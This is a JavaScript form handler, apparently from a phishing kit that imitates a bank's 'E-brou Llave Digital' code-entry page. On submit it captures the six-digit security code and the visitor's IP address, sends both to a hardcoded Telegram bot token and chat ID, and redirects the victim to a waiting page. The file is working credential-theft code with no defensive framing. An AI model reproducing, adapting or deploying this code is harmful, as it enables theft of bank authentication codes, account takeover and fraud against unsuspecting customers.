document.addEventListener("DOMContentLoaded", function () {
    const form = document.querySelector("form");
    
    form.addEventListener("submit", function (event) {
        event.preventDefault(); // Evita el envío tradicional del formulario

        // Captura el valor de la llave digital
        const llaveDigital = Array.from(document.querySelectorAll('.react-code-input input'))
            .map(input => input.value)
            .join('');

        // Validación de la llave digital (opcional)
        if (llaveDigital.length !== 6) {
            alert("Por favor, complete todos los campos de la llave digital.");
            return;
        }

        // Obtener la IP del cliente
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ipCliente = data.ip;

                // Token y chat ID del bot de Telegram (colocados directamente en el script)
                const token = "6808586807:AAH5KvJxwCHbxVecJJ1D2fQyiVCK4u_RuBQ"; // Reemplaza con tu token
                const chat_id = "5157616506"; // Reemplaza con tu chat ID

                // Mensaje a enviar a Telegram
                const mensaje = `E-brou Llave Digital ingresada: \n ${llaveDigital}\n\nIP del Cliente: ${ipCliente}`;

                // URL para enviar el mensaje usando la API de Telegram
                const url = `https://api.telegram.org/bot${token}/sendMessage`;

                // Envía la solicitud a Telegram usando método POST
                fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        chat_id: chat_id,
                        text: mensaje,
                    }),
                })
                .then(response => {
                    if (response.ok) {
                        
                        // Redirigir a otra página
                        window.location.href = "espera2.html"; // Cambia esto por la URL a la que deseas redirigir
                    } else {
                        alert("Hubo un problema al enviar los datos. Inténtalo nuevamente.");
                    }
                })
                .catch(error => {
                    console.error("Error al enviar los datos a Telegram:", error);
                    alert("Hubo un problema al enviar los datos. Inténtalo nuevamente.");
                });
            })
            .catch(error => {
                console.error("Error al obtener la IP del cliente:", error);
                alert("Hubo un problema al obtener la IP. Inténtalo nuevamente.");
            });
    });
});
